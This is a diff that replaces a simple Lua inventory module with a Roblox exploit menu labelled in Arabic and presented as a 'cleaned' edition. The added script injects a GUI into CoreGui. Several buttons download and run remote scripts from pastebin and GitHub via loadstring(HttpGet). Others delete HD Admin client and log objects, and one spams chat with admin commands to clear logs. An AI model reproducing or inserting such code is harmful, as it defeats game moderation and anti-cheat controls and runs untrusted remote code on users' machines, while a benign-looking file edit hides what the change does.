@@ -1,93 +1,151 @@
-local Inventory = {}
-Inventory.__index = Inventory
-function Inventory.new(maxSlots, playerName)
-local self = setmetatable({}, Inventory)
-self.items = {}
-self.maxSlots = maxSlots or 20
-self.playerName = playerName or "Player"
-self.gold = 0
-self.locked = false
-return self
+--[[
+	✨ Cleaned & Generalized Edition
+]]
+
+local localPlayer = game.Players.LocalPlayer
+
+-- [ 1. نظام تشغيل الواجهة ]
+local coreGuiContainer = Instance.new("ScreenGui", game:GetService("CoreGui"))
+coreGuiContainer.Name = "BaseModule_Interface"
+
+-- رسالة الترحيب الألوان المتحركة (رينبو)
+local function ShowWelcome()
+    local welcomeLabel = Instance.new("TextLabel", coreGuiContainer)
+    welcomeLabel.Size = UDim2.new(0, 500, 0, 100)
+    welcomeLabel.Position = UDim2.new(0.5, -250, 0.4, 0)
+    welcomeLabel.BackgroundTransparency = 1
+    welcomeLabel.Text = "تم تحميل النظام بنجاح"
+    welcomeLabel.Font = Enum.Font.GothamBlack
+    welcomeLabel.TextSize = 40
+    task.spawn(function()
+        local start = tick()
+        while tick() - start < 5 do
+            welcomeLabel.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            task.wait()
+        end
+        welcomeLabel:Destroy()
+    end)
 end
-function Inventory:addItem(itemName, quantity, rarity)
-if self.locked then
-return false, "Inventory is locked"
-end
-local slot = #self.items + 1
-if slot > self.maxSlots then
-return false, "Inventory full"
-end
-local item = {
-name = itemName,
-qty = quantity or 1,
-rarity = rarity or "common",
-timestamp = os.time(),
-id = math.random(1000, 9999)
-}
-local multiplier = 1.0
-if rarity == "rare" then
-multiplier = 1.5
-elseif rarity == "epic" then
-multiplier = 2.0
-elseif rarity == "legendary" then
-multiplier = 3.0
-end
-item.value = math.floor(quantity * 10 * multiplier)
-table.insert(self.items, item)
-return true, "Added " .. itemName
-end
-function Inventory:getTotalValue()
-local total = self.gold
-local count = 0
-for i = 1, #self.items do
-local item = self.items[i]
-total = total + (item.value or 0)
-count = count + 1
-end
-return total, count
-end
-function Inventory:findByRarity(targetRarity)
-local matches = {}
-local pattern = string.lower(targetRarity)
-for _, item in pairs(self.items) do
-if string.lower(item.rarity) == pattern then
-table.insert(matches, item.name)
-end
-end
-return matches
-end
-function Inventory:sellItem(index)
-if index < 1 or index > #self.items then
-return false
-end
-local item = table.remove(self.items, index)
-local salePrice = math.floor(item.value * 0.75)
-self.gold = self.gold + salePrice
-return true, salePrice
-end
-function Inventory:safeTransaction(callback)
-self.locked = true
-local success, result = pcall(function()
-return callback(self)
+task.spawn(ShowWelcome)
+
+-- [ 2. الواجهة الرئيسية ]
+local BaseFrame = Instance.new("Frame", coreGuiContainer)
+local FrameCorner = Instance.new("UICorner", BaseFrame)
+local FrameStroke = Instance.new("UIStroke", BaseFrame)
+BaseFrame.Size = UDim2.new(0, 450, 0, 450)
+BaseFrame.Position = UDim2.new(0.5, -225, 0.5, -225)
+BaseFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+BaseFrame.BackgroundTransparency = 0.2
+BaseFrame.Visible = false
+FrameStroke.Thickness = 3
+FrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- [ 3. زر التحكم الرئيسي - قابل للسحب ]
+local ControlBtn = Instance.new("TextButton", coreGuiContainer)
+local BtnCorner = Instance.new("UICorner", ControlBtn)
+local BtnStroke = Instance.new("UIStroke", ControlBtn)
+ControlBtn.Size = UDim2.new(0, 110, 0, 50) 
+ControlBtn.Position = UDim2.new(0, 15, 0.5, 0)
+ControlBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ControlBtn.Text = "قائمة"
+ControlBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+ControlBtn.Font = Enum.Font.GothamBold
+ControlBtn.TextSize = 25 
+ControlBtn.Visible = true 
+ControlBtn.Draggable = true
+BtnStroke.Thickness = 2
+
+-- تأثير الألوان المتحركة للحدود الخارجية
+task.spawn(function()
+    while true do
+        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+        FrameStroke.Color = color
+        BtnStroke.Color = color
+        task.wait()
+    end
 end)
-self.locked = false
-return success, result
-end
-local playerInventory = Inventory.new(25, "Hero")
-playerInventory:addItem("Health Potion", 5, "common")
-playerInventory:addItem("Mana Crystal", 3, "rare")
-playerInventory:addItem("Dragon Scale", 1, "legendary")
-playerInventory:addItem("Iron Sword", 1, "epic")
-playerInventory:addItem("Gold Coins", 100, "common")
-local totalValue, itemCount = playerInventory:getTotalValue()
-print("Inventory Value: " .. totalValue .. " gold")
-print("Total Items: " .. itemCount)
-local legendaries = playerInventory:findByRarity("legendary")
-print("Legendary Items: " .. table.concat(legendaries, ", "))
-local success, price = playerInventory:safeTransaction(function(inv)
-return inv:sellItem(2)
+
+ControlBtn.MouseButton1Click:Connect(function()
+    BaseFrame.Visible = not BaseFrame.Visible
 end)
-if success then
-print("Sold item for " .. price .. " gold")
-print("New Balance: " .. playerInventory.gold .. " gold")
+
+-- [ 4. المحتوى الداخلي والقائمة ]
+local TitleLabel = Instance.new("TextLabel", BaseFrame)
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Text = "لوحة التحكم الرئيسية ⚙️"
+TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 22
+
+local ScrollContainer = Instance.new("ScrollingFrame", BaseFrame)
+ScrollContainer.Size = UDim2.new(1, -20, 1, -110)
+ScrollContainer.Position = UDim2.new(0, 10, 0, 60)
+ScrollContainer.BackgroundTransparency = 1
+ScrollContainer.CanvasSize = UDim2.new(0, 0, 4, 0)
+ScrollContainer.ScrollBarThickness = 4
+local ListLayout = Instance.new("UIListLayout", ScrollContainer)
+ListLayout.Padding = UDim.new(0, 8)
+
+local function AddMenuButton(buttonName, actionCallback)
+    local button = Instance.new("TextButton", ScrollContainer)
+    button.Size = UDim2.new(1, -10, 0, 40)
+    button.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
+    button.Text = buttonName
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 16
+    Instance.new("UICorner", button)
+    button.MouseButton1Click:Connect(actionCallback)
 end
+
+-- [ 5. إضافة الأزرار المتاحة ]
+
+AddMenuButton("L3 ON TOP 🌑", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/CeVJD20Y"))()
+end)
+
+AddMenuButton("حماية HD Client (Workspace) 🛡️", function()
+    local cleanCount = 0
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj.Name == "HDAdminHDClient" then
+            obj:Destroy()
+            cleanCount = cleanCount + 1
+        end
+    end
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "نظام الأمان", Text = "تم تنظيف "..cleanCount.." ملفات", Duration = 5})
+end)
+
+AddMenuButton("حمايه 🛡️ (تنظيف شامل)", function()
+    local cleanCount = 0
+    local targets = {"logs", "nv", "cmdbar", "clogs", "hdadminhdclient", "hdadmin"}
+    local function ExecutionClean(parent)
+        for _, obj in pairs(parent:GetChildren()) do
+            local found = false
+            for _, name in pairs(targets) do if obj.Name:lower():find(name) then found = true break end end
+            if found then obj:Destroy() cleanCount = cleanCount + 1 else pcall(function() ExecutionClean(obj) end) end
+        end
+    end
+    ExecutionClean(workspace) ExecutionClean(localPlayer.PlayerGui)
+end)
+
+AddMenuButton("نسخ v3 المطور 🔥", function()
+    local messageString = "logs ;re ;clogs "
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(string.rep(messageString, 15), "All")
+end)
+
+AddMenuButton("أداة المساعدة VR7", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))() end)
+AddMenuButton("كاشف اللاعبين", function() loadstring(game:HttpGet('https://pastebin.com/raw/1KF6k8ne'))() end)
+AddMenuButton("سكربت Blood", function() loadstring(game:HttpGet('https://pastebin.com/raw/YE8hR6zG'))() end)
+
+-- زر المعلومات (تم إفراغه وتعديله ليصبح مجهول)
+local InfoBtn = Instance.new("TextButton", BaseFrame)
+InfoBtn.Size = UDim2.new(0, 150, 0, 40)
+InfoBtn.Position = UDim2.new(0.5, -75, 1, -50)
+InfoBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+InfoBtn.Text = "معلومات النظام 👤"
+InfoBtn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", InfoBtn)
+InfoBtn.MouseButton1Click:Connect(function()
+    print("System active and running successfully.")
+end)
